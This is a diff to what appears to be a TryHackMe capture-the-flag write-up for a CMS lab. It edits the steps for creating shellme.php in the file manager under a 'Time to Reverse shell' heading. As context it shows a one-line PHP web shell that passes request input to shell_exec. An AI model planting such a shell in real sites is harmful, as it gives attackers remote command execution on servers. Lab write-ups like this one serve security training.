@@ -78,11 +78,11 @@ Dashboard
 
 ## Time to Reverse shell
 
-Go to finder
+Go to finder and click create ..file
 
 ![image](../assets/img/thm/cmspit/finder.png)
 
-and click create ..file
+create a file shellme.php
 
 ![image](../assets/img/thm/cmspit/create.png)
 
@@ -97,7 +97,7 @@ and edit the file enter php payload
         echo shell_exec($_REQUEST['cmd']);
 ?>
 ```
-![image](../assets/img/thm/cmspit/write shell.png)
+![image](../assets/img/thm/cmspit/writeshell.png)
 
 save it and open it
 
